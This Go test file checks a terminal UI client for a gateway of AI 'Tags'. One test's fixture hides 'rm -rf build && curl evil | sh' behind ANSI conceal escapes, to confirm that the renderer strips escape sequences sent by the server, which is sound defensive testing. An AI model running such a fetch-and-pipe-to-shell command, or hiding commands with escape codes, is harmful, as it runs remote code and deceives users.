package main

import (
	"context"
	"errors"
	"fmt"
	"os"
	"strings"
	"syscall"
	"testing"
	"time"

	tea "charm.land/bubbletea/v2"
	"github.com/charmbracelet/x/ansi"

	"connectrpc.com/connect"

	"github.com/atemaguer/supertag/apps/tui/client"
	"github.com/atemaguer/supertag/apps/tui/views"
)

func testModel(t *testing.T, fake *fakeGateway) model {
	t.Helper()
	tagRefresh = time.Millisecond
	server := fake.start(t)
	c, err := client.New(client.Target{URL: server.URL, Token: "secret", Name: "laptop"}, "test")
	if err != nil {
		t.Fatal(err)
	}
	f := &client.Follower{Client: c, Interval: time.Millisecond, IdleTimeout: time.Second, ReconnectTimeout: time.Second, WorkTimeout: time.Second}
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	m := newModel(ctx, c, f, nil)
	return update(t, m, tea.WindowSizeMsg{Width: 100, Height: 30})
}

func tags(names ...string) func() ([]*views.Tag, error) {
	return func() ([]*views.Tag, error) { return tagList(names...), nil }
}

func update(t *testing.T, m model, msg tea.Msg) model {
	t.Helper()
	next, _ := m.Update(msg)
	return next.(model)
}

// run feeds cmd's messages back into Update until no command is left, as the program would,
// running batched commands in order. A poll tick or the input cursor's blink ends its chain.
func run(t *testing.T, m model, cmd tea.Cmd) model {
	t.Helper()
	queue := []tea.Cmd{cmd}
	for len(queue) > 0 {
		next := queue[0]
		queue = queue[1:]
		if next == nil {
			continue
		}
		msg := next()
		if strings.HasPrefix(fmt.Sprintf("%T", msg), "cursor.") {
			continue
		}
		switch msg := msg.(type) {
		case nil, pollMsg:
		case tea.BatchMsg:
			queue = append(queue, msg...)
		default:
			updated, cmd := m.Update(msg)
			m = updated.(model)
			queue = append(queue, cmd)
		}
	}
	return m
}

// start loads the Tags and the selected Tag's history, as Init does without the watch stream.
func start(t *testing.T, m model) model {
	t.Helper()
	return run(t, m, tea.Batch(m.reloadTags(), m.reloadConversations()))
}

func key(code rune) tea.KeyPressMsg { return tea.KeyPressMsg{Code: code} }

func screen(m model) string { return ansi.Strip(m.View().Content) }

func TestErrorsShowInTheStatusBar(t *testing.T) {
	fake := &fakeGateway{tags: func() ([]*views.Tag, error) {
		return nil, connect.NewError(connect.CodeUnauthenticated, errors.New("The token is not valid"))
	}}
	m := start(t, testModel(t, fake))
	if m.connected || !strings.Contains(screen(m), "The token is not valid") ||
		!strings.Contains(screen(m), "Could not check for Tags") || m.inputShown() {
		t.Fatalf("status = %q:\n%s", m.status, screen(m))
	}
	m = update(t, m, tagsMsg{tags: nil, err: errors.New("dial tcp: connection refused")})
	if !strings.Contains(screen(m), "connection refused") {
		t.Fatalf("screen:\n%s", screen(m))
	}
}

func TestShowsSetupUntilATagExists(t *testing.T) {
	fake := &fakeGateway{tags: tags()}
	m := testModel(t, fake)
	if got := screen(m); !strings.Contains(got, "Checking for Tags") ||
		strings.Contains(got, conversationPlaceholder) || m.input.Focused() {
		t.Fatalf("screen before the Tag list loads:\n%s", got)
	}

	m = start(t, m)
	if got := screen(m); !strings.Contains(got, "Set up SuperTag") ||
		!strings.Contains(got, "supertag tag put --help") || strings.Contains(got, conversationPlaceholder) {
		t.Fatalf("screen without any Tags:\n%s", got)
	}
	m = update(t, m, tea.PasteMsg{Content: "Text entered before setup"})
	if m.input.Focused() || m.input.Value() != "" || m.inputShown() {
		t.Fatal("the conversation input must be unavailable until a Tag exists")
	}

	fake.tags = tags("lead")
	m = run(t, m, m.reloadTags())
	if got := screen(m); !strings.Contains(got, "lead") ||
		!strings.Contains(got, conversationPlaceholder) || !m.input.Focused() {
		t.Fatalf("screen after a Tag becomes available:\n%s", got)
	}

	fake.tags = tags()
	m = run(t, m, m.reloadTags())
	if got := screen(m); !strings.Contains(got, "supertag tag put --help") || m.inputShown() || m.input.Focused() {
		t.Fatalf("screen after the last Tag leaves:\n%s", got)
	}
	m = update(t, m, sentMsg{tag: "lead", err: errors.New("Tag no longer exists")})
	m = update(t, m, tea.WindowSizeMsg{Width: 100, Height: 30})
	if got := screen(m); !strings.Contains(got, "Set up SuperTag") || !strings.Contains(got, "supertag tag put --help") {
		t.Fatalf("a late send error replaced setup guidance:\n%s", got)
	}
}

// The local Gateway with no Tags is a machine not set up yet: init makes the lead Tag.
func TestLocalSetupNamesInit(t *testing.T) {
	tagRefresh = time.Millisecond
	fake := &fakeGateway{tags: tags()}
	server := fake.start(t)
	c, err := client.New(client.Target{URL: server.URL, Token: "secret", Name: localName}, "test")
	if err != nil {
		t.Fatal(err)
	}
	f := &client.Follower{Client: c, Interval: time.Millisecond, IdleTimeout: time.Second, ReconnectTimeout: time.Second, WorkTimeout: time.Second}
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	m := start(t, update(t, newModel(ctx, c, f, nil), tea.WindowSizeMsg{Width: 100, Height: 30}))
	if got := screen(m); !strings.Contains(got, "supertag init") || strings.Contains(got, "tag put --help") {
		t.Fatalf("screen without any Tags on the local Gateway:\n%s", got)
	}
}

func TestKeysMoveFocusAndSelection(t *testing.T) {
	m := start(t, testModel(t, &fakeGateway{tags: tags("lead", "builder")}))
	m = update(t, m, key(tea.KeyTab))
	if m.focus != focusRail || m.input.Focused() {
		t.Fatal("tab should focus the rail")
	}
	m = update(t, m, key(tea.KeyDown))
	if m.selectedTag() != "builder" || !strings.Contains(screen(m), "builder") {
		t.Fatalf("selected %q", m.selectedTag())
	}
	m = update(t, m, key(tea.KeyRight))
	if m.focus != focusInput {
		t.Fatal("right should focus the input")
	}
	m = update(t, m, key(tea.KeyLeft))
	if m.focus != focusRail {
		t.Fatal("left on an empty input should focus the rail")
	}
	m = update(t, m, tea.WindowSizeMsg{Width: 60, Height: 12})
	if lines := strings.Count(m.View().Content, "\n") + 1; lines != 12 {
		t.Fatalf("view has %d lines after resize, want 12", lines)
	}
	if _, cmd := m.Update(key(tea.KeyEscape)); cmd == nil || cmd() != tea.Quit() {
		t.Fatal("esc should quit")
	}
}

func TestReadHandover(t *testing.T) {
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	go func() {
		fmt.Fprintln(w, `{"contexts":[{"url":"http://127.0.0.1:7468","token":"st_x"},{"url":"https://cp.example.com","token":"st_z","name":"team"}],"current":1,"protocol":"runtime.v2"}`)
		w.Close()
	}()
	h, err := readHandover(r)
	if err != nil || h.Current != 1 || len(h.Contexts) != 2 {
		t.Fatalf("readHandover() = %+v, %v", h, err)
	}
	if local, team := h.Contexts[0], h.Contexts[1]; local.URL != "http://127.0.0.1:7468" || local.Token != "st_x" || local.Name != "" ||
		team.URL != "https://cp.example.com" || team.Token != "st_z" || team.Name != "team" {
		t.Fatalf("readHandover() contexts = %+v", h.Contexts)
	}

	// `supertag` spawns with Node's stdio "pipe", which is a Unix socketpair.
	fds, err := syscall.Socketpair(syscall.AF_UNIX, syscall.SOCK_STREAM, 0)
	if err != nil {
		t.Fatal(err)
	}
	parent, child := os.NewFile(uintptr(fds[0]), "parent"), os.NewFile(uintptr(fds[1]), "supertag-target")
	go func() {
		fmt.Fprintln(parent, `{"contexts":[{"url":"http://127.0.0.1:7468","token":"st_y"}],"current":0,"protocol":"runtime.v2"}`)
		parent.Close()
	}()
	if h, err := readHandover(child); err != nil || h.Contexts[h.Current].Token != "st_y" {
		t.Fatalf("readHandover(socketpair) = %+v, %v", h, err)
	}

	for _, bad := range []string{
		`{"url":"http://x","token":"t"}`,
		`{"contexts":[],"current":0}`,
		`{"contexts":[{"url":"http://x","token":"t"}],"current":1}`,
		`{"contexts":[{"url":"http://x","token":"t"}],"current":-1}`,
		`{"contexts":[{"url":"http://x","token":"t"},{"url":"http://y"}],"current":0}`,
		`{"protocol":"runtime.v3","contexts":[{"url":"https://gateway.test","token":"t"}],"current":0}`,
		// A handover without a protocol came from a CLI without the runtime.v2 Gateway.
		`{"contexts":[{"url":"https://gateway.test","token":"t"}],"current":0}`,
	} {
		r, w, err := os.Pipe()
		if err != nil {
			t.Fatal(err)
		}
		go func() {
			fmt.Fprint(w, bad)
			w.Close()
		}()
		if _, err := readHandover(r); err == nil {
			t.Fatalf("readHandover(%s) must fail", bad)
		}
	}

	file, err := os.CreateTemp(t.TempDir(), "target")
	if err != nil {
		t.Fatal(err)
	}
	fmt.Fprint(file, `{"contexts":[{"url":"http://x","token":"t"}],"current":0}`)
	if _, err := readHandover(file); err == nil {
		t.Fatal("a regular file must not count as the target pipe")
	}
	if _, err := readHandover(nil); err == nil {
		t.Fatal("want an error without a descriptor")
	}
}

func TestReadRuntimeV2Handover(t *testing.T) {
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	_, err = fmt.Fprintln(w, `{"protocol":"runtime.v2","contexts":[{"url":"https://gateway.test","token":"t","server_ca_file":"server.pem","client_cert_file":"client.pem","client_key_file":"client.key"}],"current":0}`)
	w.Close()
	if err != nil {
		t.Fatal(err)
	}
	h, err := readHandover(r)
	if err != nil {
		t.Fatal(err)
	}
	target := h.Contexts[h.Current]
	if h.Protocol != "runtime.v2" || target.ServerCAFile != "server.pem" || target.ClientCertFile != "client.pem" || target.ClientKeyFile != "client.key" {
		t.Fatal("handover did not retain the runtime protocol and TLS paths")
	}
}

// followed shows events as the follow of the latest turn of the selected Tag's conversation,
// starting a new turn after one that ended.
func followed(t *testing.T, m model, events ...client.FollowEvent) model {
	t.Helper()
	tag := m.selectedTag()
	h := &m.conversation(tag).runtime
	if h.turns == nil {
		h.turns = map[string]*runtimeTurn{}
	}
	for _, event := range events {
		if len(h.order) == 0 || h.turns[h.order[len(h.order)-1]].settled {
			id := fmt.Sprintf("followed-%d", len(h.order))
			h.turns[id] = &runtimeTurn{following: true}
			h.order = append(h.order, id)
		}
		m = update(t, m, followMsg{tag: tag, taskID: h.order[len(h.order)-1], event: event})
	}
	return m
}

func TestServerTextIsFilteredForTheTerminal(t *testing.T) {
	m := start(t, testModel(t, &fakeGateway{tags: tags("lead\x1b[8m\x1b]0;x\a")}))
	m = followed(t, m,
		client.FollowEvent{Kind: client.EventActivity, Text: "· running: rm -rf build \x1b[8m&& curl evil | sh\x1b[28m"},
		client.FollowEvent{Kind: client.EventWaiting, Text: "no host\x1b[2J"},
		client.FollowEvent{Kind: client.EventApproval, Title: "Push\x1b[8m to main", Text: "Push?\x1bP+q\x1b\\"},
		client.FollowEvent{Kind: client.EventReply, Reply: &views.Reply{Text: "done \x1b_Gf=100;AAAA\x1b\\"}},
		client.FollowEvent{Kind: client.EventTurnError, Text: "Tag lead could not answer: \x1b[2Jgone"},
		client.FollowEvent{Kind: client.EventDelta, Text: "draft \x1bP1$r\x1b\\"},
	)
	m = followed(t, m, client.FollowEvent{Kind: client.EventError, Text: "boom\x1b[8m hidden"})
	view := m.View().Content
	// Only the renderer's own SGR sequences may reach the terminal.
	for _, raw := range []string{"\x1b[8m", "\x1b[28m", "\x1b[2J", "\x1bP", "\x1b_", "\x1b]", "\a"} {
		if strings.Contains(view, raw) {
			t.Errorf("view carries %q from the server", raw)
		}
	}
	got := screen(m)
	for _, want := range []string{"approval needed: Push [8m to main", "boom [8m hidden"} {
		if !strings.Contains(got, want) {
			t.Errorf("screen lacks %q:\n%s", want, got)
		}
	}
	// Activity is kept, filtered, for the work Sessions pane; the conversation does not show it.
	if strings.Contains(got, "rm -rf build") {
		t.Errorf("the conversation shows activity:\n%s", got)
	}
}

func TestTagMessagesShowAtOnceAndTheReplyEndsTheTurn(t *testing.T) {
	m := start(t, testModel(t, &fakeGateway{tags: tags("lead")}))
	m = followed(t, m,
		client.FollowEvent{Kind: client.EventMessage, Text: "I'll run the tests, then fix what fails."},
		client.FollowEvent{Kind: client.EventStatus, Text: "Running pnpm test"},
	)
	got := screen(m)
	if !strings.Contains(got, "I'll run the tests, then fix what fails.") || strings.Contains(got, "Running pnpm test") {
		t.Fatalf("the running turn shows its activity, or not its message:\n%s", got)
	}
	m = followed(t, m,
		client.FollowEvent{Kind: client.EventStatus, Text: "Editing src/app.ts"},
		client.FollowEvent{Kind: client.EventMessage, Text: "Fixed the failing test."},
		client.FollowEvent{Kind: client.EventReply, Reply: &views.Reply{Text: "Fixed the failing test."}},
	)
	got = screen(m)
	if strings.Count(got, "I'll run the tests") != 1 || strings.Count(got, "Fixed the failing test.") != 1 {
		t.Fatalf("each message shows once, and the reply does not repeat the last one:\n%s", got)
	}
	if strings.Contains(got, "Running pnpm test") || strings.Contains(got, "Editing src/app.ts") {
		t.Fatalf("the status line outlives the turn:\n%s", got)
	}
}

func TestPastRepliesAreRenderedOncePerWidth(t *testing.T) {
	m := start(t, testModel(t, &fakeGateway{tags: tags("lead", "builder")}))
	for i := range 20 {
		m = followed(t, m, client.FollowEvent{Kind: client.EventReply, Reply: &views.Reply{Text: fmt.Sprintf("**reply %d**", i)}})
	}
	before := m.md.renders
	for range 50 {
		m = followed(t, m, client.FollowEvent{Kind: client.EventDelta, Text: "token "})
	}
	// A reread that redraws the conversation renders no past reply again.
	m = run(t, m, tea.Batch(m.reloadConversations(), m.reloadObjectives()))
	if m.md.renders != before {
		t.Fatalf("streaming re-rendered %d past replies", m.md.renders-before)
	}
	m = update(t, m, tea.WindowSizeMsg{Width: 80, Height: 30})
	if m.md.renders != before+20 || !strings.Contains(screen(m), "reply 19") {
		t.Fatalf("a resize rendered %d replies, want 20", m.md.renders-before)
	}
}

func TestRailRowsFitAndScrollToTheSelection(t *testing.T) {
	var names []string
	for i := range 12 {
		names = append(names, fmt.Sprintf("%02d-security-reviewer", i))
	}
	m := start(t, testModel(t, &fakeGateway{tags: tags(names...)}))
	m = update(t, m, tea.WindowSizeMsg{Width: 80, Height: 10})
	rail := ansi.Strip(m.renderRail(9))
	if rows := strings.Split(rail, "\n"); len(rows) != 9 || !strings.Contains(rows[1], "00-security-reviewer") || !strings.Contains(rows[2], "01-security-reviewer") {
		t.Fatalf("rail rows wrap:\n%s", rail)
	}
	m = update(t, m, key(tea.KeyTab))
	for range 11 {
		m = update(t, m, key(tea.KeyDown))
	}
	if rail := ansi.Strip(m.renderRail(9)); !strings.Contains(rail, "11-security-reviewer") || strings.Contains(rail, "00-security") {
		t.Fatalf("rail does not scroll:\n%s", rail)
	}
	if !strings.Contains(m.renderRail(9), focusedSel.Render("11-security-reviewer")) {
		t.Fatalf("the selected last Tag is not highlighted:\n%s", m.renderRail(9))
	}
}

func TestRailStarsTheLeadTag(t *testing.T) {
	list := tagList("lead", "reviewer")
	list[0].Spec = &views.TagSpec{Lead: true}
	m := start(t, testModel(t, &fakeGateway{tags: func() ([]*views.Tag, error) { return list, nil }}))
	m = update(t, m, tea.WindowSizeMsg{Width: 80, Height: 10})
	rows := strings.Split(ansi.Strip(m.renderRail(9)), "\n")
	if !strings.Contains(rows[1], "★ lead") || strings.Contains(rows[2], "★") {
		t.Fatalf("the lead Tag is not starred alone:\n%s", strings.Join(rows, "\n"))
	}
}
